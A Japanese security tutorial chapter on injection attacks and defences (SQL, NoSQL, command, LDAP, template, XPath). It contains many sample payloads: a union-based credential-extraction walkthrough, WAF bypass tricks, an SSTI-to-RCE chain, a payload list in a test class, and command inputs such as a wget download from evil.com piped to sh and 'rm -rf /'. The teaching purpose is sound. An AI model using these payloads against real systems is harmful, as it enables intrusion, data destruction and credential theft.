# インジェクション

> SQL、NoSQL、コマンド、LDAPインジェクションの攻撃手法と、パラメータ化クエリ、ORM、入力検証による体系的な防御策を解説する。

## 前提知識

- SQL の基本文法（SELECT / INSERT / UPDATE / DELETE）
- HTTP リクエストとレスポンスの基礎（[../04-application-security/00-secure-coding.md](../04-application-security/00-secure-coding.md)）
- Python の基礎文法（コード例の理解のため）

## この章で学ぶこと

1. **各種インジェクション攻撃**（SQL/NoSQL/コマンド/LDAP/テンプレート）の原理と危険性を理解する
2. **パラメータ化クエリとORM**を使った根本的な防御手法を習得する
3. **入力検証と出力エンコード**による多層防御のアプローチを身につける
4. **Second-order インジェクション**などの高度な攻撃パターンを認識する
5. **WAF バイパス手法**を理解し、根本対策の重要性を認識する

---

## 1. インジェクション攻撃の原理

インジェクションとは、ユーザー入力がコード・クエリ・コマンドの一部として解釈されることで、攻撃者が意図しない操作を実行する脆弱性である。OWASP Top 10 2021 では第3位（A03:2021-Injection）にランクされている。

### 1.1 インジェクションが発生する根本原因

```
インジェクションの根本原因: データとコードの混在

  正常な処理:
  +-------------------------------------------------+
  | SQL文（コード）: SELECT * FROM users WHERE name = |
  | ユーザー入力（データ）: 'alice'                    |
  | → データは「値」として処理される                    |
  +-------------------------------------------------+

  インジェクション:
  +-------------------------------------------------+
  | SQL文（コード）: SELECT * FROM users WHERE name = |
  | ユーザー入力（コード+データ）: '' OR '1'='1'       |
  | → 入力がSQL文の「構造」を変えてしまう              |
  +-------------------------------------------------+

  根本的な解決策: データとコードを分離する
  → パラメータ化クエリ / プリペアドステートメント
```

```
インジェクションの基本原理:

  正常なリクエスト:
  ユーザー入力: "alice"
  生成SQL: SELECT * FROM users WHERE name = 'alice'
                                        ^^^^^^^^
                                        データとして扱われる

  攻撃リクエスト:
  ユーザー入力: "' OR '1'='1"
  生成SQL: SELECT * FROM users WHERE name = '' OR '1'='1'
                                        ^^^^^^^^^^^^^^^^^^^^^
                                        コードとして解釈される!
```

### 1.2 インジェクションの影響範囲

```
インジェクション攻撃で可能なこと:

  +-------------------+------------------------------------------+
  | 攻撃の種類        | 影響                                      |
  +-------------------+------------------------------------------+
  | データ窃取        | 全テーブルのデータ読み取り                   |
  | 認証バイパス       | 管理者アカウントへの不正ログイン              |
  | データ改ざん       | レコードの挿入・更新・削除                   |
  | 権限昇格          | DB管理者権限の取得                          |
  | OS コマンド実行    | xp_cmdshell (SQL Server) 等でOS操作       |
  | ファイル読み書き   | LOAD_FILE() / INTO OUTFILE (MySQL)       |
  | DoS              | 重いクエリで DB を過負荷にする               |
  | 二次攻撃の足掛かり | 他システムへのピボット                       |
  +-------------------+------------------------------------------+
```

---

## 2. SQLインジェクション

### 2.1 基本的な攻撃パターン

```python
# コード例1: SQLインジェクションの攻撃パターンと防御

import sqlite3

# === 脆弱なコード ===
def login_vulnerable(username, password):
    """文字列連結によるSQL構築 -> SQLインジェクション脆弱"""
    conn = sqlite3.connect("app.db")
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    # 攻撃例: username = "admin' --"
    # 生成SQL: SELECT * FROM users WHERE username='admin' --' AND password=''
    # -- 以降はコメント -> パスワード検証がスキップされる
    result = conn.execute(query).fetchone()
    return result is not None

# === 安全なコード: パラメータ化クエリ ===
def login_safe(username, password):
    """パラメータ化クエリで安全にSQLを実行"""
    conn = sqlite3.connect("app.db")
    query = "SELECT * FROM users WHERE username=? AND password=?"
    # ? はプレースホルダ -> 入力は常にデータとして扱われる
    result = conn.execute(query, (username, password)).fetchone()
    return result is not None

# === さらに安全: ORM使用 ===
from sqlalchemy.orm import Session
from sqlalchemy import select

def login_orm(session: Session, username: str, password_hash: str):
    """ORMを使用した安全なクエリ"""
    stmt = select(User).where(
        User.username == username,
        User.password_hash == password_hash,
    )
    return session.execute(stmt).scalar_one_or_none()
```

### 2.2 高度なSQLインジェクション

```
SQLインジェクションの種類:

+----------------+-----------------------------+------------------+
| 種類           | 特徴                        | 検出難度         |
+----------------+-----------------------------+------------------+
| Classic        | エラーメッセージから情報取得  | 低               |
| Union-based    | UNIONで他テーブルのデータ取得 | 中               |
| Blind (Boolean)| 真偽値の応答差から情報推測    | 高               |
| Blind (Time)   | レスポンス時間差から情報推測  | 高               |
| Second-order   | 保存後に別の場所で発動       | 非常に高         |
| Out-of-Band    | 外部チャネルでデータ送出      | 非常に高         |
+----------------+-----------------------------+------------------+
```

### 2.3 Union-based SQLインジェクションの詳細

```
Union-based SQLインジェクションの手順:

  Step 1: カラム数の特定
  入力: ' ORDER BY 1-- (成功)
  入力: ' ORDER BY 2-- (成功)
  入力: ' ORDER BY 3-- (エラー → カラム数は2)

  Step 2: 表示可能なカラムの特定
  入力: ' UNION SELECT 1,2--
  → 画面に "1" や "2" が表示される位置を確認

  Step 3: データベース情報の取得
  入力: ' UNION SELECT version(),database()--
  → MySQL 8.0.28, myapp_db

  Step 4: テーブル一覧の取得
  入力: ' UNION SELECT table_name,NULL
         FROM information_schema.tables
         WHERE table_schema=database()--

  Step 5: カラム情報の取得
  入力: ' UNION SELECT column_name,data_type
         FROM information_schema.columns
         WHERE table_name='users'--

  Step 6: データの抽出
  入力: ' UNION SELECT username,password FROM users--
```

```python
# コード例2: Blind SQLインジェクションの仕組みと対策
import time

# Blind (Boolean-based) の攻撃例
# 攻撃者のスクリプト（説明目的のみ）
def demonstrate_blind_sqli_concept():
    """
    Blind SQLiの原理を示す概念コード。
    実際のペネトレーションテストでは sqlmap 等のツールを使用する。

    脆弱なエンドポイント: /user?id=1
    正常: /user?id=1 → 200 OK (ユーザー情報表示)
    攻撃: /user?id=1 AND 1=1 → 200 OK (真)
    攻撃: /user?id=1 AND 1=2 → 404 Not Found (偽)
    → レスポンスの差異から情報を1ビットずつ抽出

    例: データベース名の1文字目を特定
    /user?id=1 AND SUBSTRING(database(),1,1)='a' → 404 (偽)
    /user?id=1 AND SUBSTRING(database(),1,1)='b' → 404 (偽)
    ...
    /user?id=1 AND SUBSTRING(database(),1,1)='m' → 200 (真!)
    → データベース名の1文字目は 'm'
    """
    pass

# Time-based Blind SQLiの原理
def demonstrate_time_based_concept():
    """
    レスポンスの有無ではなく、応答時間で真偽を判定する。

    /user?id=1; IF(SUBSTRING(database(),1,1)='m',
                    SLEEP(5), 0)
    → 5秒の遅延 = 真 (1文字目は 'm')
    → 即応答 = 偽

    対策: パラメータ化クエリを使用すればこれらの攻撃は全て防げる。
    """
    pass
```

### 2.4 Second-order SQLインジェクション

```python
# コード例3: Second-order SQLインジェクションの例と対策

# Second-order: 入力時ではなく、保存したデータの使用時に発動

# 脆弱なコード
def register_user(username, password):
    """ユーザー登録（パラメータ化されているので安全に見える）"""
    db.execute(
        "INSERT INTO users (username, password) VALUES (?, ?)",
        (username, password)  # ここは安全
    )

def change_password(username, new_password):
    """パスワード変更（ここが脆弱!）"""
    # usernameをDBから取得してSQLに埋め込む
    user = db.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()
    # user["username"] = "admin'--" (登録時に仕込まれた値)
    db.execute(
        f"UPDATE users SET password='{new_password}' WHERE username='{user['username']}'"
    )
    # 結果: UPDATE users SET password='...' WHERE username='admin'--'
    # admin のパスワードが変更される!

# 安全なコード: すべてのSQL文でパラメータ化を徹底
def change_password_safe(username, new_password):
    db.execute(
        "UPDATE users SET password=? WHERE username=?",
        (new_password, username)  # 常にパラメータ化
    )
```

```
Second-order SQLインジェクションのフロー:

  攻撃者                  アプリケーション              データベース
    |                          |                          |
    |-- 登録: username =  ---->|                          |
    |   "admin'--"             |-- INSERT (パラメータ化) ->|
    |                          |   安全に保存される         |
    |                          |                          |
    |   (後日)                  |                          |
    |-- パスワード変更依頼 ---->|                          |
    |                          |-- SELECT (パラメータ化) ->|
    |                          |<-- "admin'--" を取得 ----|
    |                          |                          |
    |                          |-- UPDATE (文字列連結!) -->|
    |                          |   WHERE username='admin'--|
    |                          |   → admin のパスワードが  |
    |                          |     変更される!           |

  教訓: データベースから取得した値も信頼してはならない。
        すべてのSQL文でパラメータ化を徹底すること。
```

### 2.5 DB ごとのパラメータ化クエリ構文

```python
# コード例4: 各データベース/言語でのパラメータ化クエリ

# --- Python ---

# SQLite3
import sqlite3
conn = sqlite3.connect("app.db")
conn.execute("SELECT * FROM users WHERE id=?", (user_id,))

# MySQL (mysql-connector-python)
import mysql.connector
conn = mysql.connector.connect(host="localhost", database="myapp")
cursor = conn.cursor(prepared=True)
cursor.execute("SELECT * FROM users WHERE id=%s", (user_id,))

# PostgreSQL (psycopg2)
import psycopg2
conn = psycopg2.connect("dbname=myapp")
cursor = conn.cursor()
cursor.execute("SELECT * FROM users WHERE id=%s", (user_id,))

# SQLAlchemy ORM
from sqlalchemy import select, text
# ORM クエリ（自動的にパラメータ化）
stmt = select(User).where(User.id == user_id)
# text() を使う場合（バインドパラメータ指定）
stmt = text("SELECT * FROM users WHERE id = :id").bindparams(id=user_id)

# --- Java ---
# PreparedStatement ps = conn.prepareStatement(
#     "SELECT * FROM users WHERE id = ?");
# ps.setInt(1, userId);
# ResultSet rs = ps.executeQuery();

# --- Node.js (pg) ---
# const result = await pool.query(
#     'SELECT * FROM users WHERE id = $1',
#     [userId]
# );

# --- Go ---
# rows, err := db.Query(
#     "SELECT * FROM users WHERE id = $1",
#     userId,
# )
```

### 2.6 SQLインジェクションのWAFバイパス手法

```
WAF バイパス手法（なぜ WAF だけでは不十分か）:

  1. 大文字小文字の混在:
     SeLeCt → SELECT と同じ意味

  2. コメント挿入:
     SEL/**/ECT → SELECT
     UN/**/ION → UNION

  3. エンコーディング:
     %53%45%4C%45%43%54 → SELECT (URLエンコード)
     CHAR(83,69,76,69,67,84) → SELECT (ASCII)

  4. 同等の関数・構文:
     SUBSTRING() → SUBSTR() → MID()
     CONCAT() → || (Oracle/SQLite)
     IF() → CASE WHEN ... THEN ... ELSE ... END

  5. ホワイトスペースの代替:
     SELECT\t*\tFROM → TABで区切り
     SELECT%0a*%0aFROM → 改行で区切り
     SELECT/**/*//**/FROM → コメントで区切り

  6. 二重エンコーディング:
     %2527 → %27 → ' (サーバーが二重デコードする場合)

  7. HTTP パラメータ汚染:
     ?id=1&id=UNION+SELECT → サーバーが後者を使用する場合

  結論: WAF はバイパス可能。根本対策はパラメータ化クエリのみ。
```

---

## 3. NoSQLインジェクション

### 3.1 MongoDB に対する攻撃

```python
# コード例5: NoSQLインジェクション（MongoDB）の攻撃と対策
from pymongo import MongoClient

client = MongoClient("mongodb://localhost:27017")
db = client["myapp"]

# === 脆弱なコード ===
def find_user_vulnerable(request_data):
    """JSONデータをそのままクエリに使用 -> NoSQL injection"""
    username = request_data["username"]
    password = request_data["password"]
    # 攻撃: {"username": "admin", "password": {"$ne": ""}}
    # $ne (not equal) で空文字以外 -> 任意のパスワードで認証成功
    user = db.users.find_one({"username": username, "password": password})
    return user

# === 安全なコード ===
def find_user_safe(request_data):
    """入力をバリデーションしてからクエリに使用"""
    username = request_data.get("username", "")
    password = request_data.get("password", "")

    # 型チェック: 文字列のみ許可（オブジェクトを拒否）
    if not isinstance(username, str) or not isinstance(password, str):
        raise ValueError("Invalid input type")

    # 長さ制限
    if len(username) > 100 or len(password) > 200:
        raise ValueError("Input too long")

    # MongoDB演算子の除去
    if any(key.startswith("$") for key in [username, password]
           if isinstance(key, str) and key.startswith("$")):
        raise ValueError("Invalid characters in input")

    user = db.users.find_one({
        "username": str(username),  # 明示的に文字列に変換
        "password_hash": hash_password(str(password)),
    })
    return user
```

### 3.2 NoSQLインジェクションの攻撃パターン

```
MongoDB NoSQLインジェクションの攻撃パターン:

  1. 演算子インジェクション:
     {"username": "admin", "password": {"$ne": ""}}
     → password が空文字でないもの → 任意のパスワードで認証

     {"username": "admin", "password": {"$gt": ""}}
     → password が空文字より大きいもの → 同様に認証バイパス

     {"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
     → 正規表現でユーザー名を部分一致

  2. $where インジェクション:
     {"$where": "this.username == 'admin' && this.password == '" + input + "'"}
     → input = "' || '1'=='1" で全レコードにマッチ

  3. 配列操作:
     {"username": "admin", "password": ["password1", "password2"]}
     → 配列のいずれかに一致すれば認証成功（MongoDB の挙動による）

  4. JavaScript インジェクション（$where / mapReduce）:
     {"$where": "function() { return this.username == '" + input + "' }"}
     → input にJSコードを挿入可能

  対策:
  - 入力の型を厳密にチェック（文字列のみ許可）
  - $ で始まるキーを拒否
  - MongoDB の演算子をホワイトリストで制限
  - $where / mapReduce の使用を避ける
```

```python
# コード例6: MongoDB向け包括的なインジェクション防御
import re
from typing import Any

class MongoSanitizer:
    """MongoDB クエリの入力サニタイゼーション"""

    MONGO_OPERATORS = {
        "$gt", "$gte", "$lt", "$lte", "$ne", "$in", "$nin",
        "$and", "$or", "$not", "$nor", "$exists", "$type",
        "$regex", "$where", "$text", "$search", "$mod",
        "$all", "$elemMatch", "$size", "$slice",
    }

    @staticmethod
    def sanitize_value(value: Any) -> Any:
        """クエリ値をサニタイズ"""
        if isinstance(value, str):
            # 文字列はそのまま（安全）
            return value
        elif isinstance(value, (int, float, bool)):
            # プリミティブ型は安全
            return value
        elif isinstance(value, dict):
            # 辞書型（MongoDB演算子の可能性）
            for key in value:
                if key.startswith("$"):
                    raise ValueError(
                        f"MongoDB operator not allowed: {key}"
                    )
            return value
        elif isinstance(value, list):
            # リスト型は各要素をサニタイズ
            return [MongoSanitizer.sanitize_value(v) for v in value]
        else:
            raise ValueError(f"Unsupported type: {type(value)}")

    @staticmethod
    def sanitize_query(query: dict) -> dict:
        """クエリ全体をサニタイズ"""
        sanitized = {}
        for key, value in query.items():
            if key.startswith("$"):
                raise ValueError(f"Top-level operator not allowed: {key}")
            sanitized[key] = MongoSanitizer.sanitize_value(value)
        return sanitized

# 使用例
sanitizer = MongoSanitizer()
try:
    # 正常なクエリ
    safe_query = sanitizer.sanitize_query({
        "username": "alice",
        "age": 25,
    })
    result = db.users.find_one(safe_query)

    # 攻撃クエリ → 例外が発生
    malicious = sanitizer.sanitize_query({
        "username": "admin",
        "password": {"$ne": ""},  # ValueError!
    })
except ValueError as e:
    print(f"Blocked malicious query: {e}")
```

---

## 4. コマンドインジェクション

### 4.1 攻撃の仕組みと対策

```python
# コード例7: コマンドインジェクションの攻撃と対策
import subprocess
import shlex
import re

# === 脆弱なコード ===
def ping_host_vulnerable(host):
    """os.systemやshell=Trueでのコマンド実行 -> コマンドインジェクション"""
    import os
    os.system(f"ping -c 3 {host}")
    # 攻撃: host = "google.com; cat /etc/passwd"
    # 実行: ping -c 3 google.com; cat /etc/passwd

# === 安全なコード ===
def ping_host_safe(host: str) -> str:
    """安全なコマンド実行"""
    # Step 1: 入力バリデーション（ホワイトリスト方式）
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        raise ValueError(f"Invalid hostname: {host}")

    # Step 2: shell=Falseでリスト形式で引数を渡す
    result = subprocess.run(
        ["ping", "-c", "3", host],  # リスト形式 -> シェル解釈されない
        capture_output=True,
        text=True,
        timeout=10,
        shell=False,  # 明示的にFalse（デフォルトだが明示する）
    )
    return result.stdout

# === より安全: 外部コマンドを使わない ===
import socket

def check_host_reachable(host: str) -> bool:
    """外部コマンドを使わずにホストの到達性を確認"""
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        raise ValueError(f"Invalid hostname: {host}")
    try:
        socket.create_connection((host, 80), timeout=5)
        return True
    except (socket.timeout, socket.error):
        return False
```

### 4.2 コマンドインジェクションの攻撃パターン

```
コマンドインジェクションの構文:

  シェルメタ文字による攻撃:
  +------------------+---------------------------------------+
  | メタ文字         | 効果                                   |
  +------------------+---------------------------------------+
  | ;                | コマンドの連結（前のコマンドの成否に関わらず）|
  | &&               | 前のコマンドが成功した場合に実行          |
  | ||               | 前のコマンドが失敗した場合に実行          |
  | |                | パイプ（前のコマンドの出力を入力にする）   |
  | $(command)       | コマンド置換                             |
  | `command`        | コマンド置換（バッククォート）             |
  | > file           | 出力をファイルにリダイレクト              |
  | < file           | ファイルから入力                         |
  | \n               | 改行（新しいコマンドとして解釈）          |
  +------------------+---------------------------------------+

  攻撃例:
  入力: "google.com; rm -rf /"
  入力: "google.com && wget http://evil.com/backdoor.sh | sh"
  入力: "google.com$(cat /etc/passwd)"
  入力: "google.com`whoami`"
```

```python
# コード例8: 安全なサブプロセス実行のラッパー
import subprocess
import re
from typing import Optional

class SafeCommandRunner:
    """安全なコマンド実行ラッパー

    原則:
    1. shell=False を常に使用
    2. 引数はリスト形式で渡す
    3. 入力をホワイトリストで検証
    4. タイムアウトを設定
    5. 実行可能コマンドを制限
    """

    ALLOWED_COMMANDS = {
        "ping": {
            "path": "/usr/bin/ping",
            "allowed_args": ["-c", "-W"],
            "input_pattern": r'^[a-zA-Z0-9.\-]+$',
        },
        "dig": {
            "path": "/usr/bin/dig",
            "allowed_args": ["+short", "+timeout"],
            "input_pattern": r'^[a-zA-Z0-9.\-]+$',
        },
        "nslookup": {
            "path": "/usr/bin/nslookup",
            "allowed_args": [],
            "input_pattern": r'^[a-zA-Z0-9.\-]+$',
        },
    }

    def run(self, command: str, args: list, user_input: str,
            timeout: int = 10) -> Optional[str]:
        """安全にコマンドを実行"""
        # コマンドのホワイトリストチェック
        if command not in self.ALLOWED_COMMANDS:
            raise ValueError(f"Command not allowed: {command}")

        cmd_config = self.ALLOWED_COMMANDS[command]

        # 引数のホワイトリストチェック
        for arg in args:
            if arg not in cmd_config["allowed_args"]:
                raise ValueError(f"Argument not allowed: {arg}")

        # ユーザー入力のバリデーション
        if not re.match(cmd_config["input_pattern"], user_input):
            raise ValueError(f"Invalid input: {user_input}")

        # コマンド実行（フルパスを使用）
        cmd = [cmd_config["path"]] + args + [user_input]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                shell=False,
                env={},  # 環境変数を空にする（PATH injection防止）
            )
            return result.stdout
        except subprocess.TimeoutExpired:
            return None

# 使用例
runner = SafeCommandRunner()
output = runner.run("ping", ["-c", "3"], "example.com")
```

---

## 5. LDAPインジェクション

### 5.1 攻撃の仕組み

```python
# コード例9: LDAPインジェクションの攻撃と対策

# === 脆弱なコード ===
def search_user_vulnerable(username):
    """文字列連結によるLDAPフィルタ構築"""
    ldap_filter = f"(&(uid={username})(objectClass=person))"
    # 攻撃: username = "*)(uid=*))(|(uid=*"
    # 生成: (&(uid=*)(uid=*))(|(uid=*)(objectClass=person))
    # -> 全ユーザーが返される
    return ldap_conn.search_s(base_dn, ldap.SCOPE_SUBTREE, ldap_filter)

# === 安全なコード ===
def ldap_escape(value: str) -> str:
    """LDAP特殊文字をエスケープする（RFC 4515準拠）"""
    escape_chars = {
        '\\': r'\5c',
        '*': r'\2a',
        '(': r'\28',
        ')': r'\29',
        '\x00': r'\00',
    }
    result = value
    # バックスラッシュを最初にエスケープする（順序重要）
    for char, replacement in escape_chars.items():
        result = result.replace(char, replacement)
    return result

def search_user_safe(username: str):
    """エスケープ済みのLDAPフィルタを構築"""
    # 入力バリデーション
    if not username or len(username) > 100:
        raise ValueError("Invalid username")

    safe_username = ldap_escape(username)
    ldap_filter = f"(&(uid={safe_username})(objectClass=person))"
    return ldap_conn.search_s(base_dn, ldap.SCOPE_SUBTREE, ldap_filter)
```

### 5.2 LDAP DN（Distinguished Name）インジェクション

```
LDAP DN インジェクション:

  LDAP フィルタとは別に、DN にもインジェクションの危険がある。

  正常: cn=alice,ou=users,dc=example,dc=com
  攻撃: cn=alice,ou=admin,ou=users,dc=example,dc=com
  → 管理者の OU にアクセスしようとする

  DN エスケープ対象文字（RFC 4514）:
  +--------+------------------+
  | 文字   | エスケープ       |
  +--------+------------------+
  | ,      | \,               |
  | +      | \+               |
  | "      | \"               |
  | \      | \\               |
  | <      | \<               |
  | >      | \>               |
  | ;      | \;               |
  | 先頭#  | \#               |
  | 先頭/末尾スペース | \20  |
  +--------+------------------+
```

---

## 6. テンプレートインジェクション（SSTI）

```python
# コード例10: Server-Side Template Injection (SSTI)
from flask import Flask, request, render_template_string

app = Flask(__name__)

# === 脆弱なコード ===
@app.route("/greet")
def greet_vulnerable():
    name = request.args.get("name", "")
    # ユーザー入力をテンプレートとして解釈 → SSTI!
    template = f"<h1>Hello, {name}!</h1>"
    return render_template_string(template)
    # 攻撃: name = {{7*7}} → "Hello, 49!"
    # 攻撃: name = {{config.SECRET_KEY}} → 秘密鍵が漏洩
    # 攻撃: name = {{''.__class__.__mro__[1].__subclasses__()}}
    #   → Python のクラス階層を辿ってRCE（リモートコード実行）

# === 安全なコード ===
@app.route("/greet")
def greet_safe():
    name = request.args.get("name", "")
    # テンプレートを固定し、変数として渡す
    return render_template_string("<h1>Hello, {{ name }}!</h1>", name=name)
    # {{ name }} はデータとして扱われ、テンプレート構文として解釈されない

# === さらに安全: Jinja2 サンドボックス ===
from jinja2.sandbox import SandboxedEnvironment

sandbox = SandboxedEnvironment()

@app.route("/greet-sandbox")
def greet_sandbox():
    name = request.args.get("name", "")
    template = sandbox.from_string("<h1>Hello, {{ name }}!</h1>")
    return template.render(name=name)
```

```
SSTI の攻撃チェーン（Jinja2の場合）:

  Step 1: テンプレートエンジンの特定
  {{7*7}} → 49 (Jinja2/Twig)
  ${7*7} → 49 (Freemarker/Velocity)
  #{7*7} → 49 (Ruby ERB)

  Step 2: 情報収集
  {{config}} → Flask設定の漏洩
  {{self}} → テンプレートオブジェクト

  Step 3: RCE（リモートコード実行）
  Jinja2:
  {{''.__class__.__mro__[1].__subclasses__()[X]}}
  → X = subprocess.Popen のインデックス
  → os.popen('id').read() の実行

  対策:
  1. ユーザー入力をテンプレートの一部にしない
  2. テンプレートは固定し、変数として渡す
  3. SandboxedEnvironment を使用
  4. テンプレートの自動リロードを無効にする
```

---

## 7. XPath インジェクション

```python
# コード例11: XPath インジェクションの攻撃と対策
from lxml import etree

# XML データ
xml_data = """
<users>
    <user>
        <username>admin</username>
        <password>secret123</password>
        <role>admin</role>
    </user>
    <user>
        <username>alice</username>
        <password>pass456</password>
        <role>user</role>
    </user>
</users>
"""

tree = etree.fromstring(xml_data.encode())

# === 脆弱なコード ===
def auth_vulnerable(username, password):
    """文字列連結によるXPath構築"""
    xpath = f"//user[username='{username}' and password='{password}']"
    # 攻撃: username = "' or '1'='1' or '"
    # XPath: //user[username='' or '1'='1' or '' and password='']
    # → 全ユーザーにマッチ
    result = tree.xpath(xpath)
    return len(result) > 0

# === 安全なコード ===
def auth_safe(username, password):
    """XPath 変数を使用した安全なクエリ"""
    # lxml の XPath 変数バインディング
    xpath = "//user[username=$username and password=$password]"
    result = tree.xpath(
        xpath,
        username=username,
        password=password,
    )
    return len(result) > 0
```

---

## 8. インジェクション防御の体系

```
インジェクション防御の多層構造:

  Layer 1: 入力バリデーション
  +----------------------------------------------+
  | ホワイトリスト、型チェック、長さ制限            |
  | 正規表現パターンマッチ、文字種制限              |
  +----------------------------------------------+
                      |
  Layer 2: パラメータ化 / ORM
  +----------------------------------------------+
  | データとコードの分離、プリペアドステートメント   |
  | ORM のクエリビルダー                           |
  +----------------------------------------------+
                      |
  Layer 3: 出力エンコード
  +----------------------------------------------+
  | コンテキスト別エスケープ（HTML/SQL/Shell/LDAP）|
  | テンプレートエンジンの自動エスケープ            |
  +----------------------------------------------+
                      |
  Layer 4: 最小権限
  +----------------------------------------------+
  | DB権限の制限、サンドボックス、WAF              |
  | OS レベルのアクセス制御                        |
  +----------------------------------------------+
                      |
  Layer 5: 検知と監視
  +----------------------------------------------+
  | WAF ログ、SQLエラーログ監視、異常検知           |
  | ペネトレーションテスト                         |
  +----------------------------------------------+
```

### インジェクション種別の対策比較

| インジェクション種別 | 根本対策 | 補助対策 | テストツール |
|-------------------|---------|---------|------------|
| SQL | パラメータ化クエリ | WAF、最小権限DB | SQLMap |
| NoSQL | 型チェック、演算子フィルタ | スキーマ検証 | NoSQLMap |
| コマンド | shell=False、引数リスト | 入力ホワイトリスト | Commix |
| LDAP | 特殊文字エスケープ | 入力バリデーション | LDAP Injection Tester |
| XPath | パラメータ化XPath | 入力制限 | - |
| テンプレート | サンドボックス + 変数分離 | テンプレートエンジン設定 | tplmap |
| Header | ヘッダー値のサニタイズ | 改行文字の除去 | Burp Suite |

### データベース権限の最小化

```sql
-- コード例12: DB権限の最小化（MySQL）

-- アプリケーション用ユーザーの作成（最小権限）
CREATE USER 'app_user'@'%' IDENTIFIED BY 'strong_password';

-- 必要なテーブルへの SELECT/INSERT/UPDATE のみ付与
GRANT SELECT, INSERT, UPDATE ON myapp.users TO 'app_user'@'%';
GRANT SELECT, INSERT ON myapp.orders TO 'app_user'@'%';

-- DELETE は特定の条件でのみ許可（ストアドプロシージャ経由）
-- 直接の DELETE 権限は付与しない

-- 危険な権限を付与しない
-- GRANT FILE ON *.* → ファイル読み書きが可能になる
-- GRANT PROCESS ON *.* → プロセスリストが見える
-- GRANT SUPER ON *.* → 管理者操作が可能

-- 読み取り専用ユーザー（レポート用）
CREATE USER 'report_user'@'%' IDENTIFIED BY 'another_password';
GRANT SELECT ON myapp.* TO 'report_user'@'%';

-- 権限の確認
SHOW GRANTS FOR 'app_user'@'%';
```

```python
# コード例13: SQLAlchemy でのデータベース接続とエラーハンドリング
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker
from sqlalchemy.exc import SQLAlchemyError
import logging

logger = logging.getLogger(__name__)

# エンジン作成（接続プールの設定）
engine = create_engine(
    "postgresql://app_user:password@localhost/myapp",
    pool_size=10,
    max_overflow=20,
    pool_recycle=3600,
    echo=False,  # 本番ではSQLログを出力しない（情報漏洩防止）
)

Session = sessionmaker(bind=engine)

class UserRepository:
    """安全なデータアクセス層"""

    def find_by_username(self, username: str):
        """ORMを使用した安全なクエリ"""
        with Session() as session:
            try:
                return session.query(User).filter(
                    User.username == username
                ).first()
            except SQLAlchemyError as e:
                # エラーメッセージにSQL詳細を含めない
                logger.error(f"Database error: {type(e).__name__}")
                raise ApplicationError("データの取得に失敗しました")

    def search_users(self, keyword: str, limit: int = 50):
        """LIKE検索の安全な実装"""
        with Session() as session:
            # LIKE のワイルドカード文字をエスケープ
            safe_keyword = keyword.replace('%', r'\%').replace('_', r'\_')
            return session.query(User).filter(
                User.username.ilike(f"%{safe_keyword}%", escape='\\')
            ).limit(min(limit, 100)).all()  # 上限を設定

    def execute_raw_query(self, query_template: str, params: dict):
        """生SQLが必要な場合の安全な実行"""
        with Session() as session:
            # text() + バインドパラメータを必ず使用
            stmt = text(query_template)
            return session.execute(stmt, params).fetchall()

# 使用例
repo = UserRepository()
user = repo.find_by_username("alice")  # パラメータ化される
results = repo.execute_raw_query(
    "SELECT * FROM users WHERE created_at > :date AND status = :status",
    {"date": "2024-01-01", "status": "active"}
)
```

---

## 9. エッジケース

### エッジケース1: ストアドプロシージャ内のインジェクション

```sql
-- ストアドプロシージャでも動的SQLは危険

-- NG: ストアドプロシージャ内で文字列連結
CREATE PROCEDURE search_users(IN search_term VARCHAR(100))
BEGIN
    SET @sql = CONCAT('SELECT * FROM users WHERE name LIKE "%',
                       search_term, '%"');
    PREPARE stmt FROM @sql;
    EXECUTE stmt;
END;

-- OK: パラメータバインディングを使用
CREATE PROCEDURE search_users_safe(IN search_term VARCHAR(100))
BEGIN
    SET @search = CONCAT('%', search_term, '%');
    PREPARE stmt FROM 'SELECT * FROM users WHERE name LIKE ?';
    EXECUTE stmt USING @search;
    DEALLOCATE PREPARE stmt;
END;
```

### エッジケース2: ORMでの安全でない使用

```python
# ORM を使っていても安全でないパターン

from sqlalchemy import text

# NG: text() 内で文字列連結
def search_unsafe(keyword):
    query = text(f"SELECT * FROM users WHERE name LIKE '%{keyword}%'")
    return db.execute(query).fetchall()

# NG: filter() 内で文字列結合
def search_unsafe2(column_name, value):
    # カラム名を動的に指定 → インジェクション可能
    query = text(f"SELECT * FROM users WHERE {column_name} = :value")
    return db.execute(query, {"value": value}).fetchall()

# OK: カラム名もホワイトリストで検証
ALLOWED_COLUMNS = {"username", "email", "status"}

def search_safe(column_name, value):
    if column_name not in ALLOWED_COLUMNS:
        raise ValueError(f"Invalid column: {column_name}")
    query = text(f"SELECT * FROM users WHERE {column_name} = :value")
    return db.execute(query, {"value": value}).fetchall()
```

### エッジケース3: エンコーディングに起因するバイパス

```
マルチバイト文字によるエスケープバイパス:

  GBK/Shift_JIS 環境での問題:
  - バックスラッシュ(\) は0x5c
  - GBKの一部の文字の2バイト目が0x5c
  - 例: 0xbf5c は GBK で有効な文字

  攻撃:
  入力: 0xbf27 (0xbf + シングルクォート)
  エスケープ後: 0xbf5c27 (0xbf + バックスラッシュ + シングルクォート)
  GBK解釈: [有効な2バイト文字]' ← クォートがエスケープされない!

  対策:
  - UTF-8 を使用し、文字エンコーディングを統一する
  - SET NAMES utf8mb4 を接続時に設定
  - パラメータ化クエリを使用（エンコーディング問題を回避）
  - mysql_real_escape_string 等のDB固有のエスケープ関数を使用
```

---

## 10. テスト手法

```python
# コード例14: インジェクション脆弱性のテスト
import requests
from typing import List, Dict

class InjectionTester:
    """インジェクション脆弱性の基本テスト"""

    SQL_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "'; DROP TABLE users; --",
        "1 UNION SELECT NULL,NULL,NULL",
        "1' AND SLEEP(5) --",
        "admin'--",
    ]

    NOSQL_PAYLOADS = [
        '{"$ne": ""}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
    ]

    COMMAND_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
    ]

    def test_sql_injection(self, url: str, param: str) -> List[Dict]:
        """SQLインジェクションの基本テスト"""
        results = []
        baseline = requests.get(url, params={param: "normal_value"})

        for payload in self.SQL_PAYLOADS:
            response = requests.get(url, params={param: payload})
            suspicious = False

